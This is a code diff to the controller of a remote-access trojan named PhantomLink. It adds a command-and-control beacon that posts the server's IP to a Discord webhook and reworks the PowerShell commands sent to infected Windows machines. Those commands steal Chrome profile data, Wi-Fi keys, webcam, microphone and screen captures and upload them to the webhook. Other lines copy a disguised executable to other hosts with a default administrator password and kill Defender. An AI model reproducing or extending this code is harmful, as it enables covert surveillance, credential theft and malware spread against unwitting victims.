@@ -14,7 +14,7 @@ import json
 from urllib.parse import urlparse, parse_qs
 import sys
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from config import DISCORD_WEBHOOK, SERVER_IP, API_KEY as _CONFIG_API_KEY
+from config import DISCORD_WEBHOOK, SERVER_IP, API_KEY as _CONFIG_API_KEY, CLIENT_PASSWORD
 
 version = 11.7 #7/3/2026
 
@@ -24,6 +24,8 @@ PORT = 5000
 
 def discord_logger(log):
     """Send a text notification to Discord via Webhook"""
+    if not DISCORD_WEBHOOK:
+        return
     try:
         if len(str(log)) > 1900:
             log = str(log)[:1900] + "\n... (truncated)"
@@ -32,8 +34,38 @@ def discord_logger(log):
         pass
 
 
+def broadcast_c2_beacon():
+    """Broadcast current C2 Server IP to Discord Webhook for client dynamic resolution"""
+    if not DISCORD_WEBHOOK:
+        return
+    try:
+        lan_ip = "127.0.0.1"
+        try:
+            s_test = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s_test.connect(("8.8.8.8", 80))
+            lan_ip = s_test.getsockname()[0]
+            s_test.close()
+        except Exception:
+            pass
+
+        pub_ip = ""
+        try:
+            pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+        except Exception:
+            pass
+
+        target_ip = pub_ip if pub_ip else lan_ip
+        log_msg = f"[PHANTOMLINK_C2_HOST] {target_ip} (LAN: {lan_ip} | PUB: {pub_ip})"
+        requests.post(DISCORD_WEBHOOK, json={"content": log_msg}, timeout=5)
+        print(f"[+] C2 IP Beacon broadcasted to Discord Webhook: {log_msg}")
+    except Exception as e:
+        print(f"[!] Beacon broadcast error: {e}")
+
+
 def discord_send_file(file_path, message=""):
     """Send a file to Discord via Webhook"""
+    if not DISCORD_WEBHOOK:
+        return
     try:
         with open(file_path, 'rb') as f:
             requests.post(DISCORD_WEBHOOK,
@@ -108,7 +140,7 @@ class ClientManager:
                     return None
 
                 password = password_data.decode('utf-8', errors='ignore').strip()
-                if password != "PhantomLink":
+                if password != CLIENT_PASSWORD:
                     print(f"[!] Invalid password from {addr[0]}")
                     conn.close()
                     return None
@@ -701,7 +733,7 @@ def interact_with_client(client_manager, client_id):
                     '$graphics = [Drawing.Graphics]::FromImage($bmp); '
                     '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
                     '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
-                    '$path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; '
+                    '$path = Join-Path $env:USERPROFILE \'screenshot.png\'; '
                     '$bmp.Save($path)"'
                 )
                 path2 = "%USERPROFILE%\\screenshot.png"
@@ -760,11 +792,9 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'camera':
                 camera = input("Select the camera: ")
-                output_path = (r"$env:USERPROFILE\webcam.jpg")
                 command3 = (
-                    f'powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" '
-                    f'-ArgumentList \'-f dshow -y -i video=\\"{camera}\\" -frames:v 1 -update 1 \\"{output_path}"\' '
-                    '-NoNewWindow -Wait"'
+                    'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; '
+                    f'if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i video=\\"{camera}\\" -frames:v 1 -update 1 \\"$env:USERPROFILE\\webcam.jpg\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
                 )
                 with client['lock']:
                     client['command_in_progress'] = True
@@ -776,7 +806,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"CameraShoot Taken [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
-                command4 = f'curl -F "file=@%USERPROFILE%/webcam.jpg" -F "content=Webcam [{username}]" {DISCORD_WEBHOOK}'
+                command4 = f'powershell -Command "if (Test-Path \'$env:USERPROFILE\\webcam.jpg\') {{ curl -F \\"file=@$env:USERPROFILE\\webcam.jpg\\" -F \\"content=Webcam [{username}]\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] webcam.jpg not found.\' }}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command4}"):
@@ -790,7 +820,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'devices':
-                command2 = '"%USERPROFILE%/ffmpeg/bin/ffmpeg.exe" -list_devices true -f dshow -i dummy'
+                command2 = 'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -813,7 +843,7 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                     name = input("Select network: ")
-                    command2 = f'netsh wlan show profile name="{name}" key=clear | findstr "Key Content"'
+                    command2 = f'powershell -NoProfile -Command "netsh wlan show profile name=\\"{name}\\" key=clear | Select-String \'(Key Content|เนื้อหาคีย์|Key-Content)\\s*:\\s*(.+)$\''
                     with client['lock']:
                         if not client_manager._send_message(conn, f"CMD:{command2}"):
                             client['command_in_progress'] = False
@@ -827,7 +857,7 @@ def interact_with_client(client_manager, client_id):
             elif cmd == 'extract':
                 path = input("FULL Path to file: ")
                 path2 = input("FULL path to extract: ")
-                command2 = f'"C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "{path}" "{path2}"'
+                command2 = f'powershell -NoProfile -Command "if (Test-Path \'C:\\Program Files\\WinRAR\\WinRAR.exe\') {{ & \'C:\\Program Files\\WinRAR\\WinRAR.exe\' x -ibck -inul \'{path}\' \'{path2}\' }} elseif (Test-Path \'C:\\Program Files\\7-Zip\\7z.exe\') {{ & \'C:\\Program Files\\7-Zip\\7z.exe\' x -y \'{path}\' -o\'{path2}\' }} else {{ Expand-Archive -Path \'{path}\' -DestinationPath \'{path2}\' -Force }}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -927,9 +957,7 @@ def interact_with_client(client_manager, client_id):
                 mic = input("Select mic: ")
                 period = input("Seconds: ")
                 discord_logger(f"Recording Audio Now . . . .")
-                ffmpeg_path = r'%USERPROFILE%\ffmpeg\bin\ffmpeg.exe'
-                output_path = r'%USERPROFILE%\mic.wav'
-                command2 = f'powershell -Command "Start-Process \'{ffmpeg_path}\' -ArgumentList \'-f dshow -y -i audio=\\"{mic}\\" -t {period} \\"{output_path}\\"\' -NoNewWindow -Wait"'
+                command2 = f'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f dshow -y -i audio=\\"{mic}\\" -t {period} \\"$env:USERPROFILE\\mic.wav\\"\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -940,7 +968,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"Audio Record Finished for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
 
-                command3 = f'curl -F "file=@%USERPROFILE%\\mic.wav" -F "content=Audio [{username}]" {DISCORD_WEBHOOK}'
+                command3 = f'powershell -Command "if (Test-Path \'$env:USERPROFILE\\mic.wav\') {{ curl -F \\"file=@$env:USERPROFILE\\mic.wav\\" -F \\"content=Audio [{username}]\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] mic.wav not found.\' }}"'
                 with client['lock']:
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
@@ -964,7 +992,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"FFMPEG setting up for [{username}]")
 
-                command3 = r'"C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'
+                command3 = r'powershell -Command "if (Test-Path \'C:\Program Files\WinRAR\WinRAR.exe\') { & \'C:\Program Files\WinRAR\WinRAR.exe\' x -ibck -inul \'$env:USERPROFILE\ffmpeg.rar\' \'$env:USERPROFILE\' } elseif (Test-Path \'C:\Program Files\7-Zip\7z.exe\') { & \'C:\Program Files\7-Zip\7z.exe\' x -y \'$env:USERPROFILE\ffmpeg.rar\' -o\'$env:USERPROFILE\' } else { tar -xf \'$env:USERPROFILE\ffmpeg.rar\' -C \'$env:USERPROFILE\' }"'
                 with client['lock']:
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
@@ -1090,7 +1118,7 @@ def interact_with_client(client_manager, client_id):
             elif cmd == 'archive':
                 path = input("FULL path of folder: ")
                 path2 = input("Save to: ")
-                command2 = f'"C:\\Program Files\\WinRAR\\rar.exe" a -r "{path2}" "{path}"'
+                command2 = f'powershell -NoProfile -Command "Compress-Archive -Path \'{path}\\*\' -DestinationPath \'{path2}\' -Force"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1278,15 +1306,15 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'rotate':
-                direction = input("up / down / left / right  : ")
-                if direction.lower().strip() == 'down':
-                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{DOWN}')"'''
-                elif direction.lower().strip() == 'up':
-                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{UP}')"'''
-                elif direction.lower().strip() == 'left':
-                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{LEFT}')"'''
-                elif direction.lower().strip() == 'right':
-                    command2 = r'''powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('^%{RIGHT}')"'''
+                direction = input("up / down / left / right  : ").lower().strip()
+                orient_map = {'up': 0, 'right': 1, 'down': 2, 'left': 3}
+                if direction in orient_map:
+                    orient_code = orient_map[direction]
+                    command2 = (
+                        'powershell -NoProfile -Command "'
+                        'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)] public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmOrientation; } public class Display { [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode); [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam); public static void Rotate(int orientation) { DEVMODE dm = new DEVMODE(); dm.dmSize = (short)Marshal.SizeOf(dm); if (EnumDisplaySettings(null, -1, ref dm) != 0) { dm.dmOrientation = orientation; ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero, 1, IntPtr.Zero); } } }\'; '
+                        f'[Display]::Rotate({orient_code})"'
+                    )
                 else:
                     print("Invalid input\n")
                     continue
@@ -1311,7 +1339,7 @@ def interact_with_client(client_manager, client_id):
                     discord_logger(f"PC [{username}] slept\n\n{response.decode('utf-8', errors='ignore')}")
 
             elif cmd == 'rickroll':
-                command2 = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+                command2 = 'start msedge --autoplay-policy=no-user-gesture-required "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" || start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1396,19 +1424,11 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'browser':
-                command2 = 'xcopy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default" "%TEMP%\\chrome_data" /E /I /H /Y'
-                command3 = '"C:\\Program Files\\WinRAR\\rar.exe" a -r "%TEMP%\\chrome.rar" "%TEMP%\\chrome_data"'
-                command4 = f'curl -F "file=@%TEMP%\\chrome.rar" -F "content=Chrome Data" {DISCORD_WEBHOOK}'
+                command2 = 'powershell -NoProfile -Command "$dest = \\"$env:TEMP\\chrome_data\\"; if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }; New-Item -ItemType Directory -Path $dest -Force | Out-Null; Copy-Item \\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\\" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Compress-Archive -Path \\"$dest\\*\\" -DestinationPath \\"$env:TEMP\\chrome.zip\\" -Force"'
+                command4 = f'powershell -NoProfile -Command "if (Test-Path \'$env:TEMP\\chrome.zip\') {{ curl -F \\"file=@$env:TEMP\\chrome.zip\\" -F \\"content=Chrome Data [{username}]\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] chrome.zip not found.\' }}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                with client['lock']:
-                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
@@ -1426,7 +1446,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'netscan':
-                command2 = '''powershell -Command "1..254 | ForEach-Object { $ip = \\"192.168.1.$_\\"; if(Test-Connection -ComputerName $ip -Count 1 -Quiet) { \\"$ip - $(Resolve-DnsName $ip -ErrorAction SilentlyContinue).NameHost\\" } }"'''
+                command2 = 'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\"$ipPrefix.$_\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1440,8 +1460,8 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'screenrec':
                 duration = input("Duration (seconds): ")
-                command2 = f'''powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" -ArgumentList \\"-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast %USERPROFILE%\\screen.mp4\\" -NoNewWindow -Wait"'''
-                command3 = f'curl -F "file=@%USERPROFILE%\\screen.mp4" -F "content=Screen Recording" {DISCORD_WEBHOOK}'
+                command2 = f'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast $env:USERPROFILE\\screen.mp4\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
+                command3 = f'powershell -Command "if (Test-Path \'$env:USERPROFILE\\screen.mp4\') {{ curl -F \\"file=@$env:USERPROFILE\\screen.mp4\\" -F \\"content=Screen Recording\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] screen.mp4 not found.\' }}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1519,7 +1539,7 @@ def interact_with_client(client_manager, client_id):
                         try {
                             $cred = New-Object System.Management.Automation.PSCredential('Administrator', (ConvertTo-SecureString 'admin' -AsPlainText -Force));
 
-                            Copy-Item '%APPDATA%\\MicrosoftUpdate\\defender.exe' \\\\\\\\$ip\\\\C$\\\\Windows\\\\Temp\\\\update.exe;
+                            Copy-Item "$env:APPDATA\\MicrosoftUpdate\\defender.exe" \\\\\\\\$ip\\\\C$\\\\Windows\\\\Temp\\\\update.exe;
 
                             Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'C:\\\\Windows\\\\Temp\\\\update.exe';
                         } catch {}
@@ -2300,6 +2320,7 @@ def main():
         return
 
     print(f"\n[+] Listening on {HOST}:{PORT}")
+    threading.Thread(target=broadcast_c2_beacon, daemon=True).start()
 
     def accept_connections():
         while True:
@@ -2529,7 +2550,7 @@ def main():
 
                         'lock': ['rundll32.exe user32.dll,LockWorkStation'],
 
-                        'rickroll': ['start https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
+                        'rickroll': ['start msedge --autoplay-policy=no-user-gesture-required "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" || start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1'],
 
                         'shutdown': ['shutdown /s /f /t 0'],
 
@@ -2550,7 +2571,7 @@ def main():
                             'taskkill /F /IM MsMpEng.exe'
 
                         ],
-                        'ffmpeg' : [f'curl http://{SERVER_IP}/ffmpeg.rar -o "%USERPROFILE%\\ffmpeg.rar" && "C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'],
+                        'ffmpeg' : [f'curl http://{SERVER_IP}/ffmpeg.rar -o "%USERPROFILE%\\ffmpeg.rar" && powershell -Command "if (Test-Path \'C:\\Program Files\\WinRAR\\WinRAR.exe\') {{ & \'C:\\Program Files\\WinRAR\\WinRAR.exe\' x -ibck -inul \'$env:USERPROFILE\\ffmpeg.rar\' \'$env:USERPROFILE\' }} elseif (Test-Path \'C:\\Program Files\\7-Zip\\7z.exe\') {{ & \'C:\\Program Files\\7-Zip\\7z.exe\' x -y \'$env:USERPROFILE\\ffmpeg.rar\' -o\'$env:USERPROFILE\' }} else {{ tar -xf \'$env:USERPROFILE\\ffmpeg.rar\' -C \'$env:USERPROFILE\' }}"'],
                         'logoff': ['shutdown /l /f'],
                         'selfdestruct': [
                             'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe',
